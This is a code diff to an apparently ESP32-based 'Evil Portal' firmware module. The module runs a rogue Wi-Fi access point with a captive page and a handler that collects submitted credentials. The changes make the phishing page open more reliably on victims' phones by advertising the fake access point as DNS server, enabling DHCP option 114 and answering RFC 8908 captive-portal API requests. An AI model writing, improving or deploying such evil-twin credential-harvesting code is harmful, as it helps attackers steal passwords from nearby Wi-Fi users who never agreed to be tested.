@@ -8,6 +8,7 @@
 #include "root/net/webInterface.h"
 #include "root/net/wifi_common.h"
 #include "esp_wifi.h"
+#include <esp_idf_version.h>
 #include "wifi_atks.h"
 
 static DNSServer &sharedEvilPortalDnsServer() {
@@ -35,7 +36,6 @@ EvilPortal::EvilPortal(
 EvilPortal::~EvilPortal() {}
 
 void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request) {
-    AsyncResponseStream *response = request->beginResponseStream("text/html");
     String url = request->url();
     if (url == "/") _portal->portalController(request);
     else if (url == "/post") _portal->credsController(request);
@@ -123,27 +123,44 @@ bool EvilPortal::setup() {
     return true;
 }
 
-void EvilPortal::beginAP() {
-    if (!_backgroundMode) {
-        drawMainBorderWithTitle("EVIL PORTAL");
-        displayTextLine("Starting...");
-    }
+void EvilPortal::configureSoftAp() {
     if (_verifyPwd) WiFi.mode(WIFI_MODE_APSTA);
     else WiFi.mode(WIFI_MODE_AP);
 
-    if (!WiFi.softAPConfig(apGateway, apGateway, IPAddress(255, 255, 255, 0))) {
+    // 4th argument is the DHCP pool start (0 = AP address + 1).
+    // 5th is the DNS server handed to clients. On this core a zero DNS is omitted
+    // from the lease, so phones associate and sit at "no internet" without opening the page.
+    if (!WiFi.softAPConfig(
+            apGateway, apGateway, IPAddress(255, 255, 255, 0), IPAddress((uint32_t)0), apGateway
+        )) {
         Serial.println("[PORTAL] softAPConfig failed");
     }
     if (!WiFi.softAP(apName, emptyString, _channel)) {
         Serial.printf("[PORTAL] softAP failed for SSID '%s' on ch%d\n", apName.c_str(), _channel);
     }
+#if ESP_IDF_VERSION >= ESP_IDF_VERSION_VAL(5, 4, 2)
+    // DHCP option 114. Modern phones open this URL instead of only probing over the internet.
+    if (!WiFi.AP.enableDhcpCaptivePortal()) {
+        Serial.println("[PORTAL] DHCP captive portal URI failed");
+    }
+#endif
     wifiConnected = true;
+}
+
+void EvilPortal::beginAP() {
+    if (!_backgroundMode) {
+        drawMainBorderWithTitle("EVIL PORTAL");
+        displayTextLine("Starting...");
+    }
+    configureSoftAp();
 
     int tmp = millis();
     while (millis() - tmp < 3000) yield();
 
     setupRoutes();
-    dnsServer->start(53, "*", WiFi.softAPIP());
+    IPAddress dnsIp = WiFi.softAPIP();
+    if (dnsIp == IPAddress((uint32_t)0)) dnsIp = apGateway;
+    if (!dnsServer->start(53, "*", dnsIp)) { Serial.println("[PORTAL] DNS server failed to start"); }
     webServer.begin();
 }
 
@@ -276,11 +293,13 @@ void EvilPortal::restartWiFi(bool reset) {
     _captiveHandler = nullptr;
 
     wifiDisconnect();
-    WiFi.softAP(apName, emptyString, _channel);
+    configureSoftAp();
     vTaskDelay(100 / portTICK_PERIOD_MS);
 
     setupRoutes();
-    dnsServer->start(53, "*", WiFi.softAPIP());
+    IPAddress dnsIp = WiFi.softAPIP();
+    if (dnsIp == IPAddress((uint32_t)0)) dnsIp = apGateway;
+    if (!dnsServer->start(53, "*", dnsIp)) { Serial.println("[PORTAL] DNS server failed to start"); }
     webServer.begin();
 
     if (reset) resetCapturedCredentials();
@@ -672,6 +691,18 @@ void EvilPortal::loadDefaultHtml() {
 
 void EvilPortal::portalController(AsyncWebServerRequest *request) {
     String apIp = WiFi.softAPIP().toString();
+    if (apIp == "0.0.0.0") apIp = apGateway.toString();
+
+    // RFC 8908. Phones that honor DHCP option 114 ask for this before showing the page.
+    if (request->hasHeader("Accept") &&
+        request->getHeader("Accept")->value().indexOf("application/captive+json") >= 0) {
+        String body = "{\"captive\":true,\"user-portal-url\":\"http://" + apIp + "/\"}";
+        AsyncWebServerResponse *response = request->beginResponse(200, "application/captive+json", body);
+        response->addHeader("Cache-Control", "private");
+        request->send(response);
+        return;
+    }
+
     String host = request->host();
     if (host.length() && host != apIp) {
         AsyncWebServerResponse *response = request->beginResponse(302);
